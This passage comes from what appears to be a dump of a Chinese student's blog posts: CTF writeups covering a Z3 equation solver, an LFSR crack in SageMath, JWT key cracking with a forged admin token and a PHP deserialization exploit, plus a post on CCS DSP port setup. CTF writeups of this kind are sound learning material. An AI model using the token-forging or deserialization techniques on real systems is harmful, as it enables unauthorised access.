0x4b82) solver.add(78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59 == 0x486c) solver.add(48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59 == 0x4002) solver.add(15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59 == 0x52d7) solver.add(26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59 == 0x2def) solver.add(34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66 == 0x28dc) solver.add(27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66 == 0x640d) solver.add(24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66 == 0x528f) solver.add(78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66 == 0x613b) solver.add(48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66 == 0x4781) solver.add(15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66 == 0x6b17) solver.add(26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66 == 0x3237) solver.add(34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73 == 0x2a93) solver.add(27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73 == 0x615f) solver.add(24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73 == 0x50be) solver.add(78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73 == 0x598e) solver.add(48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73 == 0x4656) solver.add(15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73 == 0x5b31) solver.add(26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73 == 0x313a) solver.add(34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80 == 0x3010) solver.add(27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80 == 0x67fe) solver.add(24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80 == 0x4d5f) solver.add(78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80 == 0x58db) solver.add(48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80 == 0x3799) solver.add(15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80 == 0x60a0) solver.add(26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80 == 0x2750) solver.add(34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87 == 0x3759) solver.add(27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87 == 0x8953) solver.add(24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87 == 0x7122) solver.add(78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87 == 0x81f9) solver.add(48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87 == 0x5524) solver.add(15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87 == 0x8971) solver.add(26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87 == 0x3a1d) if(solver.check()): print(solver.model()) 得到结果为： [flag[8] = 55, flag[3] = 103, flag[1] = 108, flag[16] = 98, flag[15] = 51, flag[26] = 57, flag[11] = 52, flag[18] = 45, flag[9] = 49, flag[24] = 45, flag[22] = 49, flag[30] = 54, flag[14] = 54, flag[0] = 102, flag[25] = 57, flag[40] = 52, flag[10] = 100, flag[20] = 52, flag[23] = 56, flag[37] = 102, flag[39] = 54, flag[41] = 56, flag[7] = 49, flag[17] = 57, flag[4] = 123, flag[29] = 45, flag[2] = 97, flag[33] = 52, flag[5] = 55, flag[36] = 97, flag[12] = 51, flag[38] = 101, flag[27] = 48, flag[32] = 49, flag[31] = 101, flag[34] = 99, flag[42] = 125, flag[35] = 50, flag[28] = 101, flag[21] = 101, flag[13] = 45, flag[6] = 101] 即 [102, 108, 97, 103, 123, 55, 101, 49, 55, 49, 100, 52, 51, 45, 54, 51, 98, 57, 45, 1, 52, 101, 49, 56, 45, 57, 57, 48, 101, 45, 54, 101, 49, 52, 99, 50, 97, 102, 101, 54, 52, 56, 125] 而后利用 chr 把数字转换为字符即可得到 flag。 flag{7e171d43-63b9-4e18-990e-6e14c2afe648} Z3 Introduction简介 Z3 is a theorem prover from Microsoft Research. It is licensed under the MIT license. If you are not familiar with Z3, you can start here. Pre-built binaries for stable and nightly releases are available from here. Z3 can be built using Visual Studio, a Makefile or using CMake. It provides bindings for several programming languages. See the release notes for notes on various stable releases of Z3. Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。 GitHub repo: https://github.com/Z3Prover/z3 Z3 - Slides: https://github.com/Z3Prover/z3/wiki/Slides Z3 - guide ( English ): https://rise4fun.com/z3/tutorialcontent/guide Z3 API/函数接口: http://z3prover.github.io/api/html/index.html （Python 的 Z3 接口文档，guide-examples） 据说它可以解决所有的方程，当然如果有解的话。感觉就贼强大。 微软爸爸还是强啊（ 安装这里就以 python3 为例了。 pip3 install z3-solver 注意这里不是 pip install z3！！！（是我了嘤嘤嘤，我也不知道 pip 里的 z3 是什么玩意 使用三步走： 定义未知量 添加约束条件 求解 注意：如果方程有多组解，z3 只会给出其中的一组解，因此可以尝试为方程添加约束条件，进一步限制解的范围，从而获得预期的一组解 Example: 首先看最简单的例子。 from z3 import * x = Int('x') y = Int('y') solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 运行得到 [y = 0, x = 7] 再来看稍微复杂一点的。 变量类型常用的包括 Int型（整数），Real型（有理数），BitVec型（位向量）。 解常用的方程一般是用 Int型，在求解位运算（如&amp;, ^, |, &gt;&gt;, &lt;&lt; 这些）用 BitVec型就很方便，包括下面的 LFSR 也可以用到。 求解方程组的话，需要先初始化一个Solver（约束求解器）， 然后利用 add 方法依次往里面加入方程。 其次判断解是否存在 if solver.check() == sat: 最后求解 print(solver.model()) from z3 import * x, y, z = Ints('x y z') # 可以同时定义多个变量 s = Solver() s.add('EQU1') s.add('EQU2') s.add('EQU3') if solver.check() == sat: print(solver.model()) 这道题里就用了这一方法来求解。 大概先写这么多，其他的还得慢慢学，可以参考下最后的拓展阅读喵~ LFSR题目所给代码如下。 import random from secret import flag N = 100 MASK = 2**(N+1) - 1 def lfsr(state, mask): feedback = state &amp; mask feed_bit = bin(feedback)[2:].count(\"1\") &amp; 1 output_bit = state &amp; 1 state = (state &gt;&gt; 1) | (feed_bit &lt;&lt; (N-1)) return state, output_bit def main(): assert flag.startswith(\"flag{\") assert flag.endswith(\"}\") mask = int(flag[5:-1]) assert mask.bit_length() == N state = random.randint(0, MASK) print(state) outputs = '' for _ in range(N**2): state, output_bit = lfsr(state, mask) outputs += str(output_bit) with open(\"output.txt\", \"w\") as f: f.write(outputs) main() 这题让我想起了这学期卫星导航课做的实验，让我们利用不同抽头的移位寄存器生成伪随机序列，还有m序列什么的。 m序列是最长线性移位寄存器序列的简称，是一种伪随机序列、伪噪声(PN)码或伪随机码。可以预先确定并且可以重复实现的序列称为确定序列；既不能预先确定又不能重复实现的序列称随机序列；不能预先确定但可以重复产生的序列称伪随机序列。 它是由带线性反馈的移存器产生的周期最长的序列。一般来说，一个n级线性反馈移存器可能产生的最长周期等于(2^n -1)。 在通信领域有着广泛的应用，如扩频通信、卫星通信的码分多址（CDMA），数字数据中的加密、加扰、同步、误码率测量等领域。 Via Baidu baike 线性反馈移位寄存器（linear feedback shift register, LFSR）是指，给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。异或运算是最常见的单比特线性函数：对寄存器的某些位进行异或操作后作为输入，再对寄存器中的各比特进行整体移位。 当时由于N较小，直接就用列表来写了，就是有点丑，后来想想可以用移位来实现。看了题目里面的 def lfsr(state, mask) 这一函数，发现写的就很妙啊。 当然还有这样的（2018 强网杯 streamgame1，2018 国赛 oldstreamgame） def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit) 话说回来，对于这题而言，分析可知，flag 括号内的字符是二进制位数为100位的整数。考虑到这题把 flag 作为 mask 而不是初始的状态 state，且初始 state 是随机给定的整数，LFSR 得到的伪随机序列最大重复周期为 $2^{100}-1$，爆破求解无法解出。 分析 LFSR 的逻辑可知，lfsr 函数内的输出位 $output bit = m_0x_0 + m_1x_1 + … + m_{99}x_{99}$（模二和），由于这是一个线性的方程，于是可以通过求解100个方程得到对应的系数m，也就得到了 flag。 Exp output = \"0100110011101111011111011010100111001010010100001111110110111101011110011111010010010111011100110111011001100001010010011101101000110110000011111011110000010100001001000011001011011011011001111110101111001010011011100010011110101100100101111001011100011110111101001010000000100100000111100101100100100000100110001111110011100110101000110100011001110110000110111111010111000001101110011001101111010110101000101011110111001011001111111000100100100011100100010101001100111011101111100110101011101101001001110010111011010011111001100001111111100001000001101101000001010100110011001101000101001010001001011000010111111100101111000000101000010110100110101001001100100011000111101000110011110101101111100110101010101000000001110010101001001111101001010111011110110001100101001111110111000110101011011010110101100011110010000011000110010111101010010000011101110111100011011110110001111010101011101100101101001111100100011000100101111011110001111100000110111000111111000111100000110011011011111110011111100010010110000010011100001010101011011101100011001100101100011001010010001101010011000000011110110111000000110001010010111110101011100000010100100001101011010101100110000101100010001010010111011000100001000001001110101011000010111000000010101100001010000010110110000111100011011000010111001111101110111010110000011001011101100000100000100010100100000010011010000111110010001111010000100011110000101111000110100010110101110001011101101100111000001110100100000000010011001110101110000001101100000001010111010011111000101101011001010011001101000111000010111111010101000011011001001110000011100100100010110101100001110110111001000001011111100101100011010010010110000011110100110000111011011010101110101001100110100101100101000100011001011000001011110010000011000110111011110011010001101100010010111110101101101110100111010000001101000011011010011110111101000000100011000000101001000000011010101010000100001110110000110011000111101011100100101111101111111110101000011010001101100010010100111000000010000101100100110101000001001011100011111001101001101100010100000111010101111011101111111101100000010000111110011101010100101110100101010100011110100100000111010001000100011010011100010011000001110110100110110010100100110111011001010010010100000110101110000011110010110100010101000110000111101011011010111101100111100101001101001101100111101000100101101100010111010010111100100111101101110101110011010110011111011111010000011000100010010101110001001000111111100100010100000001001010111010100010111001011011101110010110111110110100011111101110111011000111001010010110001001011011100110101111100100000101110000001011110011101110101101001011111100011001100111001011011001011011101000101100100011101000011101011010110010111111010011110111111111100001101101001101101111000100110010010100000100000100110100100110010000100101100000101010101000111110101001111111011011111101101110010100110000010110111001101110011101100001111111001110110010010011101111100111111000010011010010011100000001010011111111110001111110110110110001001001111011001101110110101100011010001111110010001011010000011110101100110010010001110010100010000000010101010010111011010101011011000010010011010110101101011100100101110001100000111110010101100010100010100010000101111000011111000111000011110001110110000011000100110010101111111111100011010000010010010111111110000000010100100101101101010111011000001010000000101011010110011101000110011011001110101101001001101100010011110001101001001000011001101100001101100000101111000001110100001100001000100000000011010011001001011110011000011011000100011011001011100111111000011011010000100000011110110011011110111000001011101101110110101000101011111110000100000111111110011111111100010101001000011010001110111111011100010111001110110001000101010001001001111111110111001101001001000110000110100000000010010100001010111101001110001011101011000100000001001001011111000100011111000011010001110001111111110111100010001110101011101011100010100000011110000100011001100000100111000111011011101000110010011010011110010010000111010001011111111010110011100111011110100111000101100100111001001010001000100011110101100100010000000000110010111101101111101011001101111000000000100000101001011110000010011110011000000100111001001110001000010011111010100001001010010100111111010111001001110110101010010100010010100101100000001010010111101101000110100111110000000111110000011110011001101010111101010111010111010000000110010001011110101110110001000110111101110101101001001100001101110001000100000110100000100000111110010110110010011111100010011111001110111011010101010001011111110000000011110001010011001101010110010101100101100110010111001100100111101000100010100010010100000010010111101100111110101101111101001010110010001111111001101010111110101111001000111101001110100000111111010000111000010101001001101100111001111111111100011010111110001101000100001010000000001101101001110001000001110010000010110001001001101010111111001001010100011011111011000011001001101000110010101000010100001001000011111001101101111011111001000010010111011010110010011010101100100000101100110110011011110000110011000000001011000111100101000011011011010010111000110101110101111100100010101010101000011000111000010001001000100110101111001001001111100110000101100010011101100001000010100010101110001111110101100101000101110000110010100101100101100101100100111111010100101010011100110100011111001000100010001101111111101011110100111001110101001101000010001011000111101110001010100101101111000110101001011101110110110110110101011010001110011111011110011010100110100111111010101111101111100110000110010111110110100110000011110110111111101111010011010000101010111100001111110110000001000001000011101001010010100100100000001101011101110011001011011110010111101111101010011010000110110101000100010110110101101010110110010011010011111111100001001000110111101001111000011001000010111100110001110110011011011100101011010101100011001111111000100000011100110011001001011000100010110000100001100011010000110110011100000111000010001011010001110010101000100010001001110001011001010000111010010101110001010100011101101110010111100010110010000011010111001101000100111011010100001010011100000100001010100010110100111000000001111100000100011100101011011101111111101101110011111010000110111101000001001110111000001000101100110100100111100100011011100010011111101010001101010100101110000110011000100001111100100001000000100011101101011011111000011110010110110101010011101000001111001011100101001001101111000011110000001010011010001110000111001101100011110011001100000111101001011000110111011001101101101100101100110100101011111111110110000111101000000100101011100111001111111011010100110010001000001101010001110010010000101111000001010100000101100000010101110100000000110011001011000011101101000000100111111010111110100011111101100001001110001100101100001010000100000110111101001101010000011100000000100000101101010010101111101100110110111000011100111001010010100101000111011001001110011111100010010010110100111101100110110111001011110010000111011111010101000010001101110011111010110011100010001111111011100110100011110110001101001110001010001110011110101111101011101100000111011011101110000110111101010001000011110011011101100011100101110100000100010110110011010101011000010010110000000100010011001110010011110010110111001111011010101111011000000111110000011011100100010011110010110000001111110111000100111010100110010111100010000110101011110011010110011001011011010010111001000000000001001010101010001100000110111101000000010100100010100101011111110011011100111101001110101010001100000100100110111110001111000011100010110001101101010011001011111101011000110110000111111101100000000001000010010010011101001000111100000010111011011001001100110000101010110001011000001011010111000111100111011010101010011100100100100010000001101001101010111110010100101000001100111110111111110000101111100110001110111010111001111110111100000111011011010111011001111010100010000111011111111000100110110001100000110101000001010010010100111011100000011111110001000010011010101001111010111100011110110110111000000111101010110001100000100001101101001101010111110001101101100101101101001000100000100110111111010011010011111010110110111101001000100010111101100011010111011111010011110000100001100101101111110010101000000101111101000001111110100000001011011111111100100110101101011100101101001011010001100010101101100000101000001110110101010100001011100010000111010011101110000000010000000000010111100111000010000000110110011011101110000001111011100011101111100011000011001000100111010101011010101110011010011011011010100011011000110111101001110011110000100010011000010000001101010010011000111000000000101100011010001000100010100100100011000101110100010001111101001010100001000000110010011101011101000000100010000011010110100111110101110001111001000000101011101010111110110100100011010000011010111111001001111101101110111110111000001010111100010001001001100000000110011100001100100111010011111011001010001101111111000010110101000011100001010110100101110111001001100000000110110101011001110000011001111100001101110100101101111100110001010011011001010110111000100010000110001111101110011100001101000100110000111000110001011011110100010101011011001001111101001110011100001110001010100011001110110101101001101010101001110011110001011101011100100001101100110110110101011101010110011100000001011010111011101000000101110111110010000000000101001110011111011001110001100010111001010010110011100001000011111101111101100111000101011100011000001100000000000010000111111010010101110101011100010100001000000100111111010111110010010111010110010100111000010111100000000100010111010010011010011001100010001000001100110100101110100110110111101010001100001010011111011100000010110110110000000100101100110100101100111001010100010001011010001010011110100110101000110001110000100111111001000110011110010111000110010001111111111101011110100111101001001101110110011111000110010111000011011111001110101101101000011010101011010111101011101111011100101001111111000101100100000011000100101001011001011110001101001100101001\" flist = [] for i in range(101): f = [] for j in output[i:i+100]: f.append(int(j)) flist.append(f) C = matrix(GF(2), flist[-1]) F = matrix(GF(2), flist[:100]) sol = F.solve_left(C) flag = \"\" for i in sol[0][::-1]: flag += str(i) print(int(flag, 2)) 首先提取线性方程系数矩阵 F 和解矩阵 C，而后利用 SageMath 求解方程即可。 其中的 GF(2)，GF 是 Galois Field 的缩写，中文称其为 Galois域或有限域， GF(2)是最简单的有限域，只有0, 1二元及+（异或运算）、×（与运算），大概可以理解为模二运算吧。 在线 SageMath： https://cocalc.com/ flag{856137228707110492246853478448} SageMath Introduction这里顺便来介绍一下 SageMath 这一工具喵！ SageMath is a free open-source mathematics software system licensed under the GPL. It builds on top of many existing open-source packages: NumPy, SciPy, matplotlib, Sympy, Maxima, GAP, FLINT, R and many more. Access their combined power through a common, Python-based language or directly via interfaces or wrappers. Mission: Creating a viable free open source alternative to Magma, Maple, Mathematica and Matlab. SageMath 是一个基于 GPL 协议的开源数学软件。它使用 Python 作为通用接口，将现有的许多开源软件包整合在一起，构建一个统一的计算平台。 一个数学求解软件，可以解方程啊 balabala，感觉用起来挺爽的。 官网： https://www.sagemath.org/ 在线版本： https://cocalc.com/ https://sagecell.sagemath.org/ By the way，这个 CoCalc 能做的不仅仅可以用来跑 SageMath，还有 Jupyter notebook, Linux terminal, X11 desktop, LaTeX document 等等，在线免费用，登录还能保存工作状态，感觉挺实用的呢。 References &amp; Extensive Reading Z3Py在CTF逆向中的运用 Z3 学习笔记 CTF 中的 LFSR 深入分析CTF中的LFSR类题目（一） 深入分析CTF中的LFSR类题目（二） etc. （先溜了","path":"2020/08/27/CTF_2020CISCN_preliminary/"},{"title":"DSP | CCS v3.3 利用I/O端口从外部文件传送数据的相关配置","text":"引言喵呜，不知不觉有一个多月没来写东西了（摊手 考试月也太难熬了吧（头秃.gif）！啊啊啊终于过来了！ 每个期末都很难过，但这个期末怕是最难受最焦虑的一个了，主要是一堆事情全堆到了考试月甚至最后的扎堆考试周。五门线上考试有四门是两门两门连着考的，期间还有各种课程的实验（及实验报告）、大作业（及其报告）、结课报告、网课考试，以及零零散散的杂事 balabala。考前赶着 ddl 一天写了两篇半报告，然后挤着时间疯狂 复 预习考试课程，人都要没了…… 这学期选了一门 DSP 原理与应用 选修课，亲身感受证明这门课太难了，唉，后悔没退掉哭唧唧。 这个大作业太难做了呀！之前折腾了好久做不出来，拖着拖着就有点佛系了（（ 做这个 DSP 大作业需要用到 CCS 软件，就是辣个 TI 出的 Code Composer Studio 集成开发环境 (IDE)，然而是用古老的 v3.3 版本！据老师是因为用到的是 DSP 型号为 TMS320C54x 系列，而这个系列只有在这一版本上才有支持。啊是挺古老的了。 去官网看了看，现在最新的是 11 Jun 2020 发布的 10.1.0.00010。 又去翻了翻 CCS 版本历史页面，拉到最下面才找到了 V3.3 版本，佛了，CCSv4.0.x是2009年发布的，那 v3.3 岂不是更古老…… 据说这个软件只支持 32 位操作系统，于是先在虚拟机里整了个 Windows 7 32bit 系统，然后才装上这古董 emmm。 而对于利用 Simulator 的 I/O 端口从外部文件传送数据的方法，查了各种资料几乎没有相关介绍，最后是在老师和小伙伴的指导和提示下，才实现了这一操作。 那正好就来记录一下吧，希望对学弟学妹们有点帮助（如果看到的话），也对想要从事相关研究的读者有所启发。 方法介绍再扯几句吧。首先是把教材上关于 CCS 使用的介绍过了一遍。 教材第三版：balabala 详见 4.7.3 小节，然而并没有这一节（估计再版的时候没改）。 翻出第一版电子版，傻了，2001年的版本，那时候还没用 CCS，是用命令行模拟的…… 网上找了各种资料，也没具体介绍，要不然就是利用 C语言（而不是汇编）来编写的代码，这个导入数据的方法又不一样，是在C语言中相应的语句打上断点，而后修改断点的条件为读取/写入数据来实现的。 看了一遍暑假要补做的 DSP 实验的指导书，貌似介绍的是更古老的 CCS 2.x 版本，这个版本又不一样，试了但数据并没有成功输入，又怀疑是输入文件格式的问题。…… 到了最后，在小伙伴提示下，找到了老师在群里发的拍的几页课本。才知道原来是第二版课本的 4.7.3 小节里做了介绍……（头秃 其实就是将 I/O 口的地址与外部的数据文件相关联。参考第二版课本，具体的实现的步骤如下。 Step 1 修改 GEL 文件 CCS 的 GEL 语言（通用扩展语言）是一种交互式的命令，它是解释执行的，即不能被编译成可执行文件。它的作用在于扩展了 CCS 的功能，可以用 GEL 来调用一些菜单命令，对DSP的存储器进行初始化配置等。 通过修改 GEL文件，定义 I/O 端口地址映像。 在初始化过程中将输出端口 PA0 映射到 0x0000，将输入端口 PA1 映射到 0x0001。 即在 C5402_Init() 函数中加入下面的语句。 GEL_MapAdd(0x0001,2,1,1,0); /* I/O Read */ GEL_MapAdd(0x0000,2,1,0,1); /* I/O Write */ 具体含义是 GEL_MapAdd(address, page, length, readable, writeable); address 端口地址值。 page 存储空间值。0：程序空间，1：数据空间，2：I/O 空间。 length 地址空间长度。对于 I/O 端口一般取为1。 readable 可读标志。1可读，0不可读。 writeable 可写标志。1可写，0不可写。 修改后的结果如图所示。 Step 2 Reload GEL File请注意，一定要重新加载 GEL 配置文件，否则这个配置是不生效的。（这里有一个掉坑里的 具体方法就是在左边的文件列表里这个 gel 文件上右键，点击 Reload 即可。 当然，还有另一种方法，那就是重启 CCS 软件。实在不行重启系统也行 23333. （重启解决绝大部分问题呢！ Step 3 Port Connect点击菜单栏下的 Tools - Port Connect。建立端口与文件之间的连接。 端口设置如下。 Port 即在 Step 1 中设置的端口，0x01 为输入端口，0x00 为输出端口。Type也相应设置。 Length 设置为1。 Page 设置为 I/O。 点击OK之后会弹出文件选择窗口，选择你要导入/导出数据的文件即可啦！ 噢对了，这里提一句，这个文件的格式是每行一个十六进制的数据，数据长度为16位，不带前导符0x，即形式为 xxxx，x为 0-F 之间的数。例如下图所示。 这个格式与利用断点输入输出数据的格式不同，要注意一下！（那个是首行有格式标识的，1651 balabala） Step 4 确认连接在下方会有一个新的窗口，配置好后的状态如下图所示。 可以通过 Connect 和 Disconnect 按钮来建立/取消端口连接。 要注意的是，这个写入的文件，在断开连接之前，都是一直被 CCS 占用着的，而且并没有实时写入文件！ （盲猜可能在输出缓存中？占用了文件句柄但没有 flush？） 因此要想看到结果的话一种方法是断开输出文件，另一种方法，关掉 CCS（简单粗暴。 Step 5 在汇编中使用端口首先定义输入输出端口如下。 PA0 .set 0 ;0口 输出 PA1 .set 1 ;1口 输入 而后结合 PORTR、PORTW 等命令使用端口即可。 PORTR PA1,@x PORTW @y,PA0 好了，大概就这些了喵~ 一种简化方法噢对了，书上还给出了一种替代方案，可以简化前述方法的 Step 3. 就是在 GEL 文件初始化函数中再加入下面的语句，直接建立端口的连接。 GEL_PortConnect(0x0001,2,1,0x01,\"C:\\\\ti\\\\C54x\\\\in.dat\"); GEL_PortConnect(0x0000,2,1,0x02,\"C:\\\\ti\\\\C54x\\\\out.dat\"); 具体含义是 GEL_PortConnect(portAddress, page, length, accessType, fileName); portAddress 端口地址值。 page 存储空间值。0：程序空间，1：数据空间，2：I/O 空间。 length 地址空间长度。对于 I/O 端口一般取为1。 accessType 存取类型。1为读取（输入），2为写入（输出）。 fileName 外部数据文件名。注意是绝对地址，目录要用双斜杠。 （不过这个办法我也没试过，不清楚怎么样喵 （也就是简化了那个端口连接的操作而已啦 其他一些 tips也算是琢磨出来的/调教出来的一些经验吧……头秃。 每次修改汇编程序，Rebuild 之后，都要记得 Reload Program（当然第一次跑程序的话就是 Load Program 了2333），将输出的 out 文件加载到 Simulator 中进行仿真调试。 画图的时候，每运行完一遍程序，都要重新启动（Restart），不然啥也没有变化，或者会出现奇奇怪怪的东西，当然也有可能是代码设计上的问题了。 画图的话必须要在停下来（halt）的时候才能绘制，不然没变化。这里可以在程序中加入断点来实现。我建议的话还可以在输出数据的位置打个断点，然后选项选择更新所有窗口（Update all windows），还是叫 Refresh Window 来着，感觉上是有用的可行的。而后在最后程序结束死循环那里再打一个断点，这样运行程序的时候，就会自动在结束时停下，把图画出来了！（当然玄学情况就不好说了23333） …… 反正经常 Reload 就完事了 hhhhh。 这个版本的软件给我的感觉就是，功能实现的设计上十分不友好，用户体验就感觉挺蠢的。 不过毕竟是多古老的版本呢！ BTW，之前还用过 CCS v9.x 版本开发 MSP432 之类的 MCU，当时用C语言开发，主要是 MCU 函数接口的资料比较少，只有官方英文文档，那时网上还没有多少关于那款 MCU 的使用经验（现在不清楚了），就比较难受，但相比而言软件使用感觉上就好多了。可能是新版本换了基于 Eclipse 开源软件框架来做界面的原因吧 23333333。 就这样吧。 （溜了喵~ ReferenceCode Composer Studio 集成开发环境 (IDE)（TI 官网） 戴明桢, 周建江. TMS320C54x DSP 结构、原理及应用(第2版)[M]. 北京:北京航空航天大学出版社.","path":"2020/07/11/Tips_CCS_RWDataFromPort/"},{"title":"CTF | 2020 NUAACTF 吸喵喵队 Writeup","text":"引言吸喵喵，冲冲冲！ 期待已久的 2020 NUAACTF 终于来了呀！ 玩(头)耍(秃)了一个下午，整体而言感觉上难度雨露均沾，然而挺茫然的。 最后终于冲到了校内第二，感觉好棒啊！ 这篇 Writeup 是由吸喵喵队共同完成的，我主要看的是 Misc、Crypto、Reverse（反正就随缘看2333），俩队友 @Noname 和 @Sophia 打 Web 和 Pwn，都挺辛苦的。 在此基础上我加了点自己的感受什么的吧。 之后复现的时候再加点东西吧（咕。 Result 上面是 不分/分 校内外 的部分榜单。 校外选手太强了啊啊啊啊！（太阔怕了嘤嘤嘤） 校内还算友好，但最后一个小时惊心动魄，排名在2-4位之间波动。 最后几分钟队友冲了一波 pwn，冲到了第二，太棒了！ 比赛开始一个小时还没恰饭，那时候看了看放出来的题，马上有思路能做的都差不多了，然后就去恰了个饭。 回来到比赛结束这中间几个小时，真 的 头 秃，又困又累又无助，就是好多题看上去能做但做不出 flag 那种……顺手打开了音乐舒缓一下心情。 平台信息http://47.102.118.76:8000 部分题目环境信息： web1 checkin:http://139.9.221.0:8086/ 已部署 web2 jwt :http://139.9.221.0:8090/ 已部署 web3 easypophttp://139.9.221.0:8088/ 已部署 web4 command inj:http://139.9.221.0:8092/ 已部署 web5-escapehttp://139.9.221.0:8094/ 已部署 misc3-babyhttp 已部署106.14.153.173 8443 pwn1-first-pwn49.235.243.206 10501https://share.weiyun.com/qoaVHGg8 pwn2-baby-format49.235.243.206 10502https://share.weiyun.com/efHNDo4X pwn3-baby-rop49.235.243.206 10503https://share.weiyun.com/gwHWgypr pwn4-easy-heap49.235.243.206 10504https://share.weiyun.com/uh36Y68j pwn5-easy-format49.235.243.206 10505https://share.weiyun.com/0zDGYyYw pwn6-baby-shellcode49.235.243.206 10506https://share.weiyun.com/HLUP79Fs 官方源码 GitHub 仓库在这里。 Webweb1-checkin看源码直接出flag BTW，这个图我最早是在以前的五四评优网站上看到的，现在那个系统已经不再使用了。那时候正好认识了于老板哈哈哈哈。（吹一波！ web2-jwt通过工具 c-jwt-crack 得到 key key:NuAa 在线平台构造 jwt https://jwt.io/ 得到 JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA 改 jwt 登录 admin 账号即可得到flag。 耗几锅锅太强了！ web3-easypop打开题目直接出源码 Exp: &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new evil(); } } class evil { private $data; } echo urlencode(serialize(new lemon())); ?&gt; 把结果直接传参给d，出flag。 Miscmisc1-假笑男孩gay木的微笑（雾 题目都提示了假笑了，总得看到笑容嘛。 直接 PNG 改高度就完事了。 于是flag： flag{i_want_jiamu_power} 我想要嘉木的力量！ misc2-wireshark直接拿 wireshark 打开，找到了一个压缩包，里面有个文件内容就是 flag 呢！ nuaactf{wir2sha4k_1s_gReat} misc3-babyhttp 你知道什么是 HTTP 吗？ （你通过一般方式是打不开网站的） Hint: The newest. 106.14.153.173 8443 之后加的 Hint: HTTP发展史 这题看到最新的 HTTP，其实我一开始就猜是 HTTP3（QUIC）了。（果然是陆老板出的题，嘤嘤嘤 毕竟我这个博客本身就基于 CloudFlare 部署了 HTTP3，只是目前的浏览器支持还不是很好。 这题试着用 Chrome 开启 QUIC 进行访问 https://106.14.154.173:8443 ，发现被拒绝。用wireshark 抓包也没抓到有关的流量，只看到了 TCP 数据包。 中途怀疑难道是 HTTP2 的一些罕见方法？于是用 postman 把所有方法都试了一遍，全被拒绝了。 再回来重新搜了一波 HTTP3 的资料，考虑是用 curl 来连接，顺便记录一下，比如下面几个： HTTP/3：过去，现在，还有未来 （这也是最后给的hint了） curl HTTP3 (and QUIC) curl 的用法指南（阮一峰） libcurl programming tutorial How to Test if a Website supports HTTP/3? How to Build and Install latest cURL version on CentOS/RHEL? 网站 HTTP3 部署测试： HTTP/3 Test, Check if H3/QUIC is enabled on your website HTTP/3 CHECK 然后按照上面的流程基于 Rust &amp; quiche 来安装 curl。 Build quiche and BoringSSL: git clone --recursive https://github.com/cloudflare/quiche cd quiche cargo build --release --features pkg-config-meta,qlog mkdir deps/boringssl/lib ln -vnf $(find target/release -name libcrypto.a -o -name libssl.a) deps/boringssl/lib/ 而后 Build curl: cd .. git clone https://github.com/curl/curl cd curl ./buildconf ./configure LDFLAGS=\"-Wl,-rpath,$PWD/../quiche/target/release\" --with-ssl=$PWD/../quiche/deps/boringssl 